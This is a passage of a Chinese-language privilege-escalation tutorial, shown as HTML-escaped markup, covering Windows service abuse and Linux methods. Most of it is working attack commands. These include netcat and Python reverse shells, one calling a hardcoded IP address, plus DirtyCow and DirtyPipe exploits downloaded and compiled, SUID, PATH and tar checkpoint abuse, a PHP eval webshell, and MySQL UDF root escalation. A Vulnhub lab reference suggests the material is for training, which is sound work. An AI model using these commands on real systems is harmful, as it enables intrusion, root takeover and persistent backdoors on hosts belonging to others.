class=&#34;line&#34;&gt;https://github.com/PowerShellMafia/PowerSploit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;accesschk 下载地址:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;accesschk.exe -uwcqv &amp;quot;administrators&amp;quot; * Import-Module .\PowerUp.ps1 &amp;amp;&amp;amp; Invoke-All Checks sc config &amp;quot;test&amp;quot; binpath=&amp;quot;C:\Program.exe&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sc start test&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;linux提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux提权&#34;&gt;#&lt;/a&gt; linux 提权&lt;/h3&gt;
&lt;h4 id=&#34;辅助项目提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#辅助项目提权&#34;&gt;#&lt;/a&gt; 辅助项目提权&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;项目地址&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xpYW1nL3RyYWl0b3I=&#34;&gt;https://github.com/liamg/traitor&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0FsZXNzYW5kcm9aL0JlUm9vdA==&#34;&gt;https://github.com/AlessandroZ/BeRoot&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JlYm9vdHVzZXIvTGluRW51bQ==&#34;&gt;https://github.com/rebootuser/LinEnum&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xpbnV4LWV4cGxvaXQtc3VnZ2VzdGVy&#34;&gt;https://github.com/mzet-/linux-exploit-suggester&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NsZXZlbnR5ZWxldmVuL2xpbnV4cHJpdmNoZWNrZXI=&#34;&gt;https://github.com/sleventyeleven/linuxprivchecker&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2pvbmRvbmFzL2xpbnV4LWV4cGxvaXQtc3VnZ2VzdGVyLQ==&#34;&gt;https://github.com/jondonas/linux-exploit-suggester-&lt;/span&gt; 2&lt;br&gt;
Linux：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v&#34;&gt;https://gtfobins.github.io/&lt;/span&gt;&lt;br&gt;
Windows：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sb2xiYXMtcHJvamVjdC5naXRodWIuaW8v&#34;&gt;https://lolbas-project.github.io/&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;项目大致分类&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一个综合类探针 traitor，一个自动化提权 BeRoot (gtfobins&amp;amp;lolbas)，两个信息收集 LinEnum linuxprivchecker，两个漏洞探针 linux-exploit-suggester&amp;amp;2&lt;/p&gt;
&lt;h4 id=&#34;suid提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid提权&#34;&gt;#&lt;/a&gt; suid 提权&lt;/h4&gt;
&lt;p&gt;chmod u+s 给予普通用户可以借助 root 权限执行某些命令，chmod u-s 可以删除 suid。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;手工命令探针安全&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -user root -perm - 4000 - print 2&amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -user root -perm - 4000 - exec ls -ldb &amp;#123;&amp;#125; \;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;脚本项目探针安全&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LinEnum.sh traitor linuxprivchecker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用NC反弹&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find xiaodi -exec netcat -lvp 5555 -e /bin/sh \;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netcat xx.xx.xx.xx 5555&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;从 4444 端口获取到命令，bash 运行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执行监听。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc x.x.x.x 4444 | /bin/bash | nc x.x.x.x 5555&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用Python反弹&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find xiaodi -exec python -c &amp;#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.co nnect((&amp;quot;47.94.236.117&amp;quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&amp;#x27; \;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvp 7777&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;脏牛提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#脏牛提权&#34;&gt;#&lt;/a&gt; 脏牛提权&lt;/h4&gt;
&lt;p&gt;搜寻 exp 直接提权。连接服务器，获取可利用漏洞，下载或上传 EXP，编译 EXP，给权限执行。&lt;/p&gt;
&lt;p&gt;探针项目：BeRoot linux-exploit-suggester linux-exploit-suggester2&lt;/p&gt;
&lt;p&gt;如 gcc 45010.c -o exp &amp;amp;&amp;amp; sh exp&lt;/p&gt;
&lt;p&gt;linux 脏牛 dcow&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;内核提权整个过程：（linux-exploit-suggester获取信息）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过msf拿到web权限，上传脏牛漏洞利用脚本exp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;upload /root/dcow.cpp /tmp/dcow.cpp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;#x27;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./dcow &amp;amp;&amp;amp; su root&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;脏管道提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#脏管道提权&#34;&gt;#&lt;/a&gt; 脏管道提权&lt;/h4&gt;
&lt;p&gt;Linux-DirtyPipe 提权 (CVE-2022-0847)&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget https://haxx.in/files/dirtypipez.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc -o dirtypipez dirtypipez.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;任何具体suid权限的文件均可&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./dirtypipez /usr/bin/su&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;环境变量配合suid&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境变量配合suid&#34;&gt;#&lt;/a&gt; 环境变量配合 suid&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;探针&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -user root -perm -4000 -print 2&amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc demo.c -o shell &amp;amp;&amp;amp; chmod u+s shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;root用户可执行文件进行编译，保证文件的正常授权运行，给予 ROOT权限执行，普通用户通过对文件反编译或源代码查看，覆盖其执行环境变量，直接让其执行指定程序获取权限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp /bin/bash /tmp/ps &amp;amp;&amp;amp; export PATH=/tmp:$PATH &amp;amp;&amp;amp; ./shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;定时任务配合tar&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#定时任务配合tar&#34;&gt;#&lt;/a&gt; 定时任务配合 tar&lt;/h4&gt;
&lt;p&gt;利用计划任务的备份功能 tar 命令的参数利用，在计划任务中定时执行 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Rlc3Quc2g=&#34;&gt;test.sh&lt;/span&gt; 命令，执行之后会生成 bash 的 s 文件，可利用此进行提权；也可以利用直接将 反弹 shell 的代码写入 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Rlc3Quc2g=&#34;&gt;test.sh&lt;/span&gt;，只需监听端口，定时任务触发后就会接收到反弹 shell。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;echo &amp;quot;&amp;quot; &amp;gt; &amp;quot;--checkpoint-action=exec=sh test.sh&amp;quot;;echo &amp;quot;&amp;quot; &amp;gt; --checkpoint=1;echo&#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#39; &amp;gt; test.sh;chmod +x test.sh&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;权限配置不当&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#权限配置不当&#34;&gt;#&lt;/a&gt; 权限配置不当&lt;/h4&gt;
&lt;p&gt;利用不安全的权限分配操作导致的定时文件覆盖，导致某些文件可以被普&lt;/p&gt;
&lt;p&gt;通用户修改，且此文件会定时执行。&lt;/p&gt;
&lt;p&gt;所有者 / 组 / 其他：读取 4 写入 2 执行 1&lt;/p&gt;
&lt;p&gt;755 表示所有者读取写入执行，组和其他用户只有读取和执行&lt;/p&gt;
&lt;p&gt;644 表示所有者写入和执行，组和其他用户只有执行&lt;/p&gt;
&lt;p&gt;444 r–r--r-- 600 rw------- 644 rw-r–r-- 666 rw-rw-rw-&lt;br&gt;
700 rwx------ 744 rwxr–r-- 755 rwxr-xr-x 777 rwxrwxrwx&lt;/p&gt;
&lt;h4 id=&#34;linux-mysql提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux-mysql提权&#34;&gt;#&lt;/a&gt; linux mysql 提权&lt;/h4&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcmF2ZW4tMiwyNjkv&#34;&gt;https://www.vulnhub.com/entry/raven-2,269/&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;webshell 获取&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;探针IP及端口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nmap 192.168.46.0/24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用phpmailer漏洞进行修改并反弹&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python D:/Myproject/40974.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;写入后门利用菜刀连接方便操作&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;&amp;lt;?php eval($_POST[x]);?&amp;gt;&amp;#x27; &amp;gt;1.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;上传信息收集脚本进行提权信息收集&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./LinEnum.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;翻阅数据库配置文件获取root密码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;mysql&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用Mysql提权 searchsploit，下载mysql udf kali poc进行编译：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget https://www.exploit-db.com/download/1518 - O raptor_udf.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc -g -c raptor_udf.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc -g -shared -o raptor_udf.so 1518.so -lc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;上传或下载 1518 到目标服务器：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget https://xx.xx.xx.xx/1518.so&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;mysql udf 提权&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;进入数据库进行UDF导出：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use mysql;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create table foo(line blob);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;insert into foo values(load_file(&amp;#x27;/tmp/1518.so&amp;#x27;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select * from foo into dumpfile &amp;#x27;/usr/lib/mysql/plugin/1518.so&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;创建do_system函数调用：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create function do_system returns integer soname &amp;#x27;1518.so&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select do_system(&amp;#x27;chmod u+s /usr/bin/find&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;配合使用find调用执行：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;touch xiaodi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find xiaodi –exec &amp;quot;whoami&amp;quot; \;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find xiaodi –exec &amp;quot;/bin/sh&amp;quot; \;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;mysql 允许外联&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GRANT ALL PRIVILEGES ON *.* TO &amp;#x27;root&amp;#x27;@&amp;#x27;%&amp;#x27; IDENTIFIED BY&amp;#x27;R@v3nSecurity&amp;#x27; WITH GRANT OPTION;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flush privileges;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;允许 root 外连若还是无法连接，则可能是防火墙的阻止，可利用 webshell工具将端口穿透出来。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;mdut-数据库提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mdut-数据库提权&#34;&gt;#&lt;/a&gt; mdut 数据库提权&lt;/h4&gt;
&lt;p&gt;MDUT 2.0 数据库利用工具：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1NhZmVHcm9jZXJ5U3RvcmUvTURVVA==&#34;&gt;https://github.com/SafeGroceryStore/MDUT&lt;/span&gt;&lt;/p&gt;
